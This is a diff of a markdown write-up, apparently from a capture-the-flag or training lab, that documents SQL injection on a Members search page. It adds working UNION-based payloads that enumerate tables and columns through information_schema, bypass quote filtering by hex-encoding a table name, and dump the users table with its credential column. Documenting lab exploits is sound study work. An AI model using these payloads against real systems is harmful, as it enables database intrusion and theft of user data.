@@ -9,16 +9,28 @@ A SQL Injection vulnerability found on the Members page allows attackers to expl
 ## Discovery & Exploitation
 
 ### 1. Confirm the Vulnerability
+- Input in search: `1' OR TRUE`
+- Result: With single quote did not work.
+
 - Input in search: `1 OR TRUE`
 - Result: Returns all members, confirming SQL injection.
 
-### 2. Extract DB Info
+### 2. Extract DB and Table Info
 - Query: `-1 union select database(), user()`
 - Result: Reveals DB name and user.
 
+- Query: `-1 UNION SELECT 1,table_name FROM information_schema.tables `
+- Result: Reveals all Table names
+
 ### 3. Enumerate Structure
 - Query: `-1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database() --`
-- Result: Lists table/column names (e.g., `users`, `user_id`, `countersign`, etc.)
+- Result: Lists table/column names (e.g., `users`, `user_id`, `first_name`, `Commentaire`, `countersign`, etc.)
+
+another option is directly using hex value of the Table "users" which is 0x7573657273
+since using quote i.e. FROM "users" is not possible
+
+- Query: `-1 union select column_name, table_name FROM information_schema.columns WHERE table_name LIKE 0x7573657273`
+- Result: Lists table/column names (e.g., `users`, `user_id`, `first_name`, `Commentaire`, `countersign`, etc.)
 
 ### 4. Dump User Data
 - Query: `-1 UNION SELECT concat(Commentaire, countersign), concat(user_id,first_name,last_name, country,town,planet) FROM users --`
